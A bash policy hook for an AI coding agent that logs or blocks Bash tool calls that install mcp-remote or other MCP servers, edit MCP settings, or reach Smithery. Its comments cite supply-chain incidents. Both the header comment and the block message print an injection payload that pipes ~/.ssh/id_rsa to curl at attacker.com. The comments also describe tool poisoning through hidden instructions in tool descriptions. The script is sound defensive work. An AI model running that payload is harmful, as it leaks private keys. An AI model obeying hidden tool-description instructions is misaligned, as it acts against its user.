#!/usr/bin/env bash
# =============================================================================
# Policy 13: MCP SERVER VALIDATION
# =============================================================================
# Audits and blocks tool calls to unrecognized or known-malicious MCP servers.
# Flags use of mcp-remote proxy (CVE-2025-6514) and supply chain risks.
#
# Real incidents:
#   • CVE-2025-6514 — mcp-remote OAuth Proxy RCE (2025):
#     The `mcp-remote` npm package (437,000 downloads) had a critical shell
#     injection vulnerability. Malicious MCP servers could specify any value
#     in `authorization_endpoint`, which was passed unsanitized to a shell
#     command. Payload: `; cat ~/.ssh/id_rsa | curl -d @- https://attacker.com`
#     A developer connecting to a malicious MCP server via mcp-remote achieved
#     RCE on the developer's machine with zero user interaction.
#
#   • Postmark-MCP supply chain attack (September 2025):
#     The first confirmed malicious MCP server published to a public registry.
#     Since version 1.0.16, the server copied every email sent through the
#     Postmark integration to an attacker-controlled server while silently
#     extracting API keys from the environment. 1,643 developers installed it.
#     There was no indication in the MCP server UI that emails were being copied.
#
#   • Smithery MCP supply chain attack (October 2025):
#     The Smithery MCP hosting platform was compromised, affecting 3,000+
#     hosted MCP applications and their API tokens. Any org using Smithery-
#     hosted MCP servers had all their API tokens (including Anthropic, OpenAI,
#     AWS, GitHub PATs) exposed to the attacker. The attack persisted for
#     11 days before detection.
#
#   • MCP tool poisoning (2025, 84.2% success rate):
#     Researchers showed that injecting malicious instructions into an MCP
#     tool's description field (which the AI reads to understand the tool)
#     caused the AI to perform unintended actions with 84.2% success rate.
#     The developer sees a normal tool; the AI sees hidden instructions.
#
# What this detects:
#   1. Installation of MCP servers not in the project allowlist
#   2. Connection to known-malicious MCP server patterns
#   3. Use of mcp-remote (CVE-2025-6514 vulnerable)
#   4. Smithery-hosted MCP connections (prior supply chain compromise)
#   5. MCP server configuration changes in settings files
# =============================================================================

set -euo pipefail

INPUT_FILE="${HOOK_INPUT_FILE:-/dev/stdin}"
TOOL_NAME=$(jq -r '.tool_name // "unknown"' < "$INPUT_FILE")
SESSION_ID=$(jq -r '.session_id // "unknown"' < "$INPUT_FILE")
TIMESTAMP="${TIMESTAMP:-$(date -u +"%Y-%m-%dT%H:%M:%SZ")}"

[[ "$TOOL_NAME" == "Bash" ]] || exit 0

COMMAND=$(jq -r '.tool_input.command // ""' < "$INPUT_FILE")
[[ -z "$COMMAND" ]] && exit 0

MATCHED=""
REASON=""
SEVERITY="audit"  # audit or block

# ---- Pattern 1: mcp-remote installation or use (CVE-2025-6514) ----
if echo "$COMMAND" | grep -qiE '(npm\s+(install|i)|npx|yarn\s+add|pnpm\s+add).*mcp-remote\b'; then
  MATCHED="mcp-remote installation (CVE-2025-6514 — shell injection, 437K downloads)"
  REASON="$COMMAND"
  SEVERITY="block"
fi

# Catch npx mcp-remote usage (running without explicit install)
if [[ -z "$MATCHED" ]] && echo "$COMMAND" | grep -qiE 'npx\s+mcp-remote\b'; then
  MATCHED="mcp-remote proxy usage (CVE-2025-6514 — shell injection via OAuth endpoint)"
  REASON="$COMMAND"
  SEVERITY="block"
fi

# ---- Pattern 2: MCP server installation generally ----
# Audit all MCP server installs for supply chain visibility
if [[ -z "$MATCHED" ]] && echo "$COMMAND" | grep -qiE '(npm\s+(install|i)|npx|yarn\s+add).*(-server|mcp-server|-mcp)\b'; then
  MATCHED="MCP server package installation"
  REASON="$COMMAND"
  SEVERITY="audit"
fi

# ---- Pattern 3: Claude settings.json modification to add MCP server ----
# When the agent writes to settings.json adding an mcpServers entry — audit it
if [[ -z "$MATCHED" ]] && echo "$COMMAND" | grep -qiE '(claude_desktop_config\.json|\.claude/settings\.json)'; then
  if echo "$COMMAND" | grep -qiE '(mcpServers|mcp_servers|mcp-server)'; then
    MATCHED="MCP server configuration change in Claude settings"
    REASON="$COMMAND"
    SEVERITY="audit"
  fi
fi

# ---- Pattern 4: Smithery hosted MCP endpoints ----
if [[ -z "$MATCHED" ]] && echo "$COMMAND" | grep -qiE 'smithery\.(ai|cloud|io)'; then
  MATCHED="Smithery-hosted MCP connection (prior supply chain compromise Oct 2025)"
  REASON="$COMMAND"
  SEVERITY="audit"
fi

[[ -z "$MATCHED" ]] && exit 0

# ---- Audit log ----
mkdir -p "${AUDIT_DIR:-$HOME/.claude/audit}"
jq -n \
  --arg ts       "$TIMESTAMP" \
  --arg tool     "$TOOL_NAME" \
  --arg policy   "mcp-validation" \
  --arg matched  "$MATCHED" \
  --arg cmd      "$(echo "$COMMAND" | head -c 200)" \
  --arg session  "$SESSION_ID" \
  --arg cwd      "${CWD:-}" \
  --arg severity "$SEVERITY" \
  '{timestamp:$ts, event:"policy_audit", policy:$policy, tool:$tool, matched:$matched, cmd:$cmd, session:$session, cwd:$cwd, severity:$severity}' \
  >> "${AUDIT_LOG:-$HOME/.claude/audit/policy-violations.jsonl}"

if [[ "$SEVERITY" == "block" ]]; then
  EVENT_TYPE="policy_blocked"
  # Update log entry type
  # (already logged above — add a block event too)
  jq -n \
    --arg ts       "$TIMESTAMP" \
    --arg tool     "$TOOL_NAME" \
    --arg policy   "mcp-validation" \
    --arg matched  "$MATCHED" \
    --arg cmd      "$(echo "$COMMAND" | head -c 200)" \
    --arg session  "$SESSION_ID" \
    --arg cwd      "${CWD:-}" \
    '{timestamp:$ts, event:"policy_blocked", policy:$policy, tool:$tool, matched:$matched, cmd:$cmd, session:$session, cwd:$cwd}' \
    >> "${AUDIT_LOG:-$HOME/.claude/audit/policy-violations.jsonl}"

  cat >&2 <<EOF

╔══════════════════════════════════════════════════════════════╗
║     ORG POLICY VIOLATION — DANGEROUS MCP SERVER BLOCKED      ║
╚══════════════════════════════════════════════════════════════╝

Tool attempted : $TOOL_NAME
Matched        : $MATCHED
Command        : $(echo "$COMMAND" | head -c 120)

Why this matters:
  • CVE-2025-6514 (mcp-remote, 437K downloads): Shell injection via
    the OAuth authorization_endpoint parameter. A malicious MCP server
    achieves RCE on your machine with zero user interaction.
    Payload: `; cat ~/.ssh/id_rsa | curl -d @- https://attacker.com`
  • Postmark-MCP (Sep 2025): First malicious MCP server in the wild —
    silently copied all emails + extracted API keys. 1,643 installs.
  • Smithery (Oct 2025): Platform-level compromise exposed 3,000+ app
    API tokens including Anthropic, OpenAI, AWS, GitHub PATs.
  • MCP tool poisoning: 84.2% success rate — hidden instructions in
    tool descriptions cause the AI to perform unintended actions.

What to do instead:
  • Review MCP servers at: https://github.com/modelcontextprotocol/servers
  • Check source code, stars, and maintainer before any MCP install
  • Prefer official/verified MCP servers over third-party ones
  • Add approved MCP servers to .claude/mcp-allowlist.txt

Violation logged to: ~/.claude/audit/policy-violations.jsonl

EOF

  exit 2

else
  # Audit mode — print warning but allow
  cat >&2 <<EOF

╔══════════════════════════════════════════════════════════════╗
║      ORG POLICY NOTICE — MCP SERVER ACTIVITY LOGGED          ║
╚══════════════════════════════════════════════════════════════╝

Tool attempted : $TOOL_NAME
Notice         : $MATCHED
Command        : $(echo "$COMMAND" | head -c 120)

Supply chain visibility: MCP servers have full tool execution access.
  • Postmark-MCP (Sep 2025): malicious server exfiltrated all emails + API keys
  • Smithery (Oct 2025): 3,000+ apps compromised via hosting platform
  • Before installing any MCP server, verify: source, stars, maintainer

This install is being logged. Review ~/.claude/audit/policy-violations.jsonl

EOF
  exit 0
fi
